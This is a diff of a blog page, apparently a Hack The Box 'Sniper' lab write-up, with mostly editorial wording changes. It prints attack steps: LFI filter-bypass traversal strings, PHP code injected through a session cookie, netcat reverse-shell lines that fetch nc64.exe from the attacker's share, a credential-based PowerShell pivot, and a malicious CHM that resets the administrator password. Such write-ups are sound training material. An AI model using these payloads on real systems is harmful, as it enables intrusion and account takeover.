@@ -66,15 +66,14 @@
 
 <h3 id="summary">Summary</h3>
 <ul>
-  <li>The box is a <strong>Windows</strong> machine <strong>hosting a PHP website</strong> which had both a <strong>LFI</strong> (intended) and <strong>RFI</strong> (unintended) vulnerabilities.</li>
+  <li>The box is a <strong>Windows</strong> machine <strong>hosting a PHP website</strong> which had both a <strong>LFI</strong> (intended) and a <strong>RFI</strong> (unintended) vulnerabilities.</li>
   <li><em>Down the LFI path, and after working around some</em> <strong>blacklisting</strong> <em>and</em> <strong>hardening</strong>, we manage to <strong>inject PHP code into the cookies</strong> and <strong>include them to gain RCE.</strong></li>
-  <li>We gain initial access as <code class="language-plaintext highlighter-rouge">NT Authority\iusr</code>. And, <em>as we are taking a look around the web root</em>, we find <strong>credentials</strong> for a local user called <code class="language-plaintext highlighter-rouge">chris</code> in the <strong>database settings file.</strong></li>
+  <li>We gain initial access as <code class="language-plaintext highlighter-rouge">NT Authority\iusr</code>. And, <em>as we are taking a look around the</em> <strong>web root</strong>, we find <strong>credentials</strong> for a local user called <code class="language-plaintext highlighter-rouge">chris</code> in the <strong>database settings file.</strong></li>
   <li>We used <strong>PowerShell</strong> to gain <strong>another reverse shell</strong> as that user and started looking for ways to escalate our privileges.</li>
   <li><em>In <code class="language-plaintext highlighter-rouge">chris</code>’s <code class="language-plaintext highlighter-rouge">Downloads</code> folder</em>, we found a file called <code class="language-plaintext highlighter-rouge">instructions.chm</code> which mentioned <strong>some documentation work to be delivered to the company’s CEO</strong>.</li>
-  <li><em>Also relevant to the same topic,</em> a folder called <code class="language-plaintext highlighter-rouge">Docs</code> in the root of the <code class="language-plaintext highlighter-rouge">C:</code> drive.</li>
-  <li>The folder contained a <strong>note for the developer</strong> (<code class="language-plaintext highlighter-rouge">chris</code>) from the CEO <strong>asking for the documentation to be dropped there</strong> when done.</li>
+  <li><em>Also relevant to the same topic,</em> a folder called <code class="language-plaintext highlighter-rouge">Docs</code> in the root of the <code class="language-plaintext highlighter-rouge">C:</code> drive contained a <strong>note for the developer</strong> (<code class="language-plaintext highlighter-rouge">chris</code>) from the CEO <strong>asking for the documentation to be dropped there</strong> when done.</li>
   <li><em>To exploit the situation</em>, we create a <strong>malicious .CHM file</strong> using the <strong>Nishang PowerShell Suite</strong> to <strong>execute commands</strong> if that file was opened.</li>
-  <li><em>After placing the file in the <code class="language-plaintext highlighter-rouge">Docs</code> folder</em>, a few moments pass and the file gets removed. We verify execution of our payload (resetting the <code class="language-plaintext highlighter-rouge">administrator</code>’s password) by logging in and we’re authenticated successfully.</li>
+  <li><em>After placing the file in the <code class="language-plaintext highlighter-rouge">Docs</code> folder</em>, a few moments pass and the file gets removed. We <strong>verify execution of our payload</strong> (resetting the <code class="language-plaintext highlighter-rouge">administrator</code>’s password) by logging in and we’re successfully authenticated.</li>
 </ul>
 
 <hr />
@@ -102,9 +101,9 @@ Host script results:
 |_clock-skew: 6h59m59s
 </code></pre></div></div>
 
-<p>Nmap gives a few things to check:</p>
+<p>Nmap gives us a few things to check:</p>
 <ol>
-  <li>Port 80</li>
+  <li><strong>HTTP</strong> on Port 80</li>
   <li><strong>RPC</strong> on port 135</li>
   <li><strong>SMB</strong> on port 445</li>
 </ol>
@@ -112,7 +111,7 @@ Host script results:
 <p>We start with <strong>SMB</strong> and <strong>RPC</strong> since they are a quick check.</p>
 
 <h3 id="smb-enumeration">SMB Enumeration</h3>
-<p>we check the usual null, anonymous and guest authentication with <code class="language-plaintext highlighter-rouge">crackmapexec</code> but don’t get much past the <strong>OS</strong> and the <strong>hostname</strong>.
+<p>we check the usual <strong>null, anonymous and guest authentication</strong> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> but don’t get much past the <strong>OS</strong> and the <strong>hostname</strong>.
 <img src="/assets/Sniper/SMB-Enum.jpg" alt="SMB-Enum" /></p>
 
 <h3 id="rpc-enumeration">RPC Enumeration</h3>
@@ -244,7 +243,7 @@ Completed after 19.76 seconds
 <ul>
   <li><strong>PHP stores the username inside them</strong> &amp; <strong>we have the ability to register users</strong></li>
   <li><em>Also, In Windows, by default,</em> they are kept in a <em>likely accessible</em> directory <code class="language-plaintext highlighter-rouge">"c:\windows\temp"</code></li>
-  <li>Their file name has a known format: <code class="language-plaintext highlighter-rouge">"sess_&lt;PHP_SESSID_COOKIE_VALUE&gt;"</code></li>
+  <li>Their file name has a known format: “<code class="language-plaintext highlighter-rouge">sess_&lt;PHP_SESSID_COOKIE_VALUE&gt;</code>”</li>
 </ul>
 
 <p>So we need to:</p>
@@ -266,11 +265,11 @@ Completed after 19.76 seconds
   <li><strong>Password:</strong> <code class="language-plaintext highlighter-rouge">"a"</code></li>
 </ul>
 
-<p>This use has a special type of security. No one could ever guess creds like these :D :D :D</p>
+<p><strong><em>This user has a special type of security. No one could ever guess creds like these :D :D</em></strong></p>
 
-<p><em>Jokes aside,</em> here are the <strong>requests and responses for the registration and login</strong>.</p>
+<p><em>Jokes aside,</em> here are the <strong>requests and responses for both the registration and login</strong>.</p>
 
-<p>the response we got was a <strong>302 redirection to the initial login page</strong></p>
+<p><em>Upon submitting the registration request,</em> the response we got was a <strong>302 redirection to the initial login page</strong></p>
 
 <p><img src="/assets/Sniper/registratio-initial-request.jpg" alt="registratio-initial-request" /></p>
 
@@ -298,11 +297,11 @@ Completed after 19.76 seconds
 <p><img src="/assets/Sniper/lfi-no-full-path.jpg" alt="lfi-no-full-path" /></p>
 
 <p><em>After many many tries:</em></p>
-<ul>
-  <li><strong>Normal traversal sequences</strong> like <code class="language-plaintext highlighter-rouge">../../</code></li>
-  <li><strong>Nested</strong> ones such as <code class="language-plaintext highlighter-rouge">....//</code> or <code class="language-plaintext highlighter-rouge">....\/</code></li>
-  <li><strong>Single</strong> and <strong>Double URL encoding</strong></li>
-  <li>and other techniques..</li>
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Normal traversal sequences</strong> like <code class="language-plaintext highlighter-rouge">../../</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Nested</strong> ones such as <code class="language-plaintext highlighter-rouge">....//</code> or <code class="language-plaintext highlighter-rouge">....\/</code></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Single</strong> and <strong>Double URL encoding</strong></li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />and other techniques..</li>
 </ul>
 
 <p>I found out that I could include the cookie like this:</p>
@@ -312,12 +311,12 @@ Completed after 19.76 seconds
 <p><img src="/assets/Sniper/lfi-abs-path-success.jpg" alt="lfi-abs-path-success" /></p>
 
 <p>That’s because the <strong>PHP</strong> code is likely:</p>
-<ol>
+<ul>
   <li><strong>Not accepting</strong> any <code class="language-plaintext highlighter-rouge">..</code> sequences</li>
   <li><strong>Not accepting</strong> <code class="language-plaintext highlighter-rouge">c:</code> in the request</li>
   <li><strong>Doesn’t like the path</strong> when it’s missing a <code class="language-plaintext highlighter-rouge">/</code> or <code class="language-plaintext highlighter-rouge">\</code> in the beggining</li>
   <li><strong>But is alright with specifying the path without the</strong> <code class="language-plaintext highlighter-rouge">c:</code> <strong>part</strong></li>
-</ol>
+</ul>
 
 <p>We now know that <strong>we can include the input of the username field into the HTML.</strong></p>
 
@@ -365,8 +364,7 @@ Completed after 19.76 seconds
 
 <p>this is good! Because:</p>
 <ul>
-  <li><code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code> are the <strong>tags</strong> needed to <strong>inject PHP</strong></li>
-  <li><code class="language-plaintext highlighter-rouge">?</code> is used in the declaration</li>
+  <li><code class="language-plaintext highlighter-rouge">&lt;</code>, <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">?</code> are need for the <strong>tags</strong> needed to <strong>inject PHP</strong></li>
   <li>and the <strong>backtick</strong> can be used for <strong>code execution</strong> (<em>just like in</em> <strong>Bash</strong>)</li>
 </ul>
 
@@ -378,12 +376,12 @@ Completed after 19.76 seconds
 
 <p><img src="/assets/Sniper/rce-achieved.jpg" alt="rce-achieved" /></p>
 
-<p><em>with RCE achieved,</em> we have to find a way to <strong>execute a reverse shell with the allowed characters we have.</strong></p>
+<p><em>with</em> <strong>RCE</strong> <em>achieved,</em> we have to find a way to <strong>execute a reverse shell with the allowed characters we have.</strong></p>
 
 <p><strong>We have a couple of challenges here:</strong></p>
 <ul>
   <li>the <strong>dollar sign</strong> (<code class="language-plaintext highlighter-rouge">$</code>), the <strong>brackets</strong> <code class="language-plaintext highlighter-rouge">(</code> and <code class="language-plaintext highlighter-rouge">[</code> along with the <strong>underscore</strong> (<code class="language-plaintext highlighter-rouge">_</code>) are blocked, which enable the standard <strong>PHP backdoor</strong> <code class="language-plaintext highlighter-rouge">&lt;?php exec($_REQUEST["cmd"]);?&gt;</code></li>
-  <li><em>also,</em> the <strong>dot</strong> (<code class="language-plaintext highlighter-rouge">.</code>) is blocked, so we can’t use our <strong>ip address</strong> in the payload to download something by either HTTP or SMB</li>
+  <li><em>also,</em> the <strong>dot</strong> (<code class="language-plaintext highlighter-rouge">.</code>) is blocked, so we can’t use our <strong>ip address</strong> in the payload to download something.</li>
   <li><em>And, with the</em> <strong>backslash</strong> <code class="language-plaintext highlighter-rouge">\</code> <em>blocked as well,</em> it means <strong>writing to paths other that the current directory isn’t allowed</strong></li>
 </ul>
 
@@ -391,7 +389,7 @@ Completed after 19.76 seconds
 
 <p>This <strong>feature</strong> was <em>initially built</em> to <strong>make handling tricky sequences of special characters easier.</strong></p>
 
-<p><em>Even though the dash</em> (<code class="language-plaintext highlighter-rouge">-</code>) <em>is blocked</em>, this trick is still accessible with the <em>whitelisted</em> <strong>forward slash</strong> (<code class="language-plaintext highlighter-rouge">/</code>).</p>
+<p><em>Even though the dash</em> (<code class="language-plaintext highlighter-rouge">-</code>) <em>is blocked</em>, <strong>this trick is still doable</strong> with the <em>whitelisted</em> <strong>forward slash</strong> (<code class="language-plaintext highlighter-rouge">/</code>).</p>
 
 <p>This is similar to <strong>regular windows commands</strong> (ex: <code class="language-plaintext highlighter-rouge">ipconfig /all</code>)</p>
 
@@ -411,14 +409,14 @@ Completed after 19.76 seconds
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.10.16.3\s\nc64.exe -e powershell 10.10.16.3 9000
 </code></pre></div></div>
 
-<p><em>thankfully, after all this hard work,</em> we’re rewarded with a <strong>sweeet reverse shell :D</strong></p>
+<p><em>thankfully, after all this hard work,</em> we’re rewarded with a <strong>reverse shell :D</strong></p>
 
 <p><img src="/assets/Sniper/shell-as-iusr.jpg" alt="shell-as-iusr" /></p>
 
 <h3 id="finding-creds-in-the-database-settings-file-like-always">Finding creds in the database settings file (like always)</h3>
-<p><em>The first I did after getting the shell,</em> was <strong>check the files in the web root.</strong></p>
+<p><em>The first thing I did after getting the shell,</em> was <strong>check the files in the web root.</strong></p>
 
-<p>I find a file called <code class="language-plaintext highlighter-rouge">db.php</code> in the <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\user</code> directory.</p>
+<p>I found a file called <code class="language-plaintext highlighter-rouge">db.php</code> in the <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\user</code> directory.</p>
 
 <p><strong>The contents were:</strong></p>
 
@@ -433,9 +431,9 @@ Completed after 19.76 seconds
 <p><img src="/assets/Sniper/got-chris.jpg" alt="got-chris" /></p>
 
 <h3 id="getting-a-shell-as-chris">Getting a shell as Chris</h3>
-<p>The situation is that we want to pivot to the <code class="language-plaintext highlighter-rouge">chris</code> user <strong>without losing the shell</strong> (<em>that we worked so hard for XD</em>)</p>
+<p>The situation is that we want to pivot to the <code class="language-plaintext highlighter-rouge">chris</code> user <strong>without losing the shell</strong> <em>if possible</em></p>
 
-<p>We can do so from our <strong>PowerShell</strong> reverse shell using the below method:</p>
+<p>We can do so from our <strong>PowerShell</strong> prompt using the below method:</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"Sniper\chris"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"36mEAhz/B8xQ~2VM"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">))</span><span class="w">
 </span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nx">127.0.0.1</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Scriptblock</span><span class="w"> </span><span class="p">{</span><span class="n">\\10.10.16.3\s\nc64.exe</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nx">10.10.16.3</span><span class="w"> </span><span class="nx">9001</span><span class="p">}</span><span class="w"> </span><span class="nt">-AsJob</span><span class="w">
@@ -445,7 +443,7 @@ Completed after 19.76 seconds
 
 <p><img src="/assets/Sniper/shell-as-chris.jpg" alt="shell-as-chris" /></p>
 
-<p>Sweet :D</p>
+<p><strong>Neat :)</strong></p>
 
 <h3 id="privilege-escalation-scanning-the-file-system">Privilege Escalation: Scanning the file system</h3>
 <p><em>When checking the folders in chris’s user profile,</em> we find a file called <code class="language-plaintext highlighter-rouge">intructions.chm</code> in his <code class="language-plaintext highlighter-rouge">Downloads</code> folder.</p>
@@ -464,9 +462,9 @@ Completed after 19.76 seconds
   <li><strong>That document</strong> looks like <strong>a draft for its documentation</strong></li>
 </ul>
 
-<p><em>other than that, according to the text,</em> it seems like the chris guy is really stressed out and thinking about quitting the his job because the CEO is overloading him with work.</p>
+<p><em>other than that, according to the text,</em> it seems like the chris guy is really stressed out and thinking about quitting his job because the CEO is overloading him with work.</p>
 
-<p>We don’t know if this information would be handy or not. But we take note of it and move on.</p>
+<p>We don’t know if this information would be handy or not. But we take note of it nonetheless and move on.</p>
 
 <p><em>In the system root</em> (<code class="language-plaintext highlighter-rouge">c:\</code>), we find a folder that <strong>sticks out:</strong> <code class="language-plaintext highlighter-rouge">Docs</code></p>
 
@@ -475,7 +473,7 @@ Completed after 19.76 seconds
 <p><img src="/assets/Sniper/docs-and-note-txt.jpg" alt="docs-and-note-txt" /></p>
 
 <p><em>Apart from the CEO bullying the chris guy,</em><br />
-<em>and even leaving him a copy of</em> <code class="language-plaintext highlighter-rouge">"php for dummies-trial.pdf"</code> <em>as further insult,</em></p>
+<em>and even leaving him a copy of</em> <code class="language-plaintext highlighter-rouge">"php for dummies-trial.pdf"</code> <em>as further insult XD</em></p>
 
 <ul>
   <li>he is <strong>asking about the documentation for the new app</strong> (<em>very possibly referring to the android project in development</em>).</li>
@@ -486,10 +484,10 @@ Completed after 19.76 seconds
 
 <p><em>if the CEO happens to be the local <code class="language-plaintext highlighter-rouge">administrator</code> and opens the file,</em> we should root the box.</p>
 
-<h3 id="malicious-chm-files-for-the-win">Malicious CHM files For The Win</h3>
-<p><em>Searching</em> <strong>Google</strong>, we come accross this <a href="/assets/Sniper/https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e">blog</a> explaining exactly <strong>how to execute a payload using a <code class="language-plaintext highlighter-rouge">.chm</code> file</strong> using a script from the <strong>Nishang script suite.</strong></p>
+<h3 id="chm-files-for-the-win">CHM Files for the win</h3>
+<p><em>Searching</em> <strong>Google</strong>, we come accross this <a href="https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e">blog</a> explaining exactly <strong>how to execute a payload using a <code class="language-plaintext highlighter-rouge">.chm</code> file</strong> using a script from the <strong>Nishang script suite.</strong></p>
 
-<p><em>Following the article,</em> we download the <strong>“HTML Help Workshop and Documentation program”</strong> and <strong>get the script</strong> from the <a href="/assets/Sniper/https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Github Repository</a>.</p>
+<p><em>Following the article,</em> we download the <strong>“HTML Help Workshop and Documentation program”</strong> and <strong>get the script</strong> from the <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Github Repository</a>.</p>
 
 <p>We <strong>import</strong> the <code class="language-plaintext highlighter-rouge">Out-CHM.ps1</code> file and use it to get a <code class="language-plaintext highlighter-rouge">doc.chm</code> file</p>
 
@@ -497,7 +495,7 @@ Completed after 19.76 seconds
 
 <p><em>After copying it to the <code class="language-plaintext highlighter-rouge">Docs</code> folder and waiting a few moments,</em> The <code class="language-plaintext highlighter-rouge">.chm</code> file <strong>gets executed</strong>. and <strong>the Administrator’s password is changed</strong></p>
 
-<p>We confirmed with <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
+<p>We confirm with <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
 
 <p><img src="/assets/Sniper/got-admin.jpg" alt="got-admin" /></p>
 
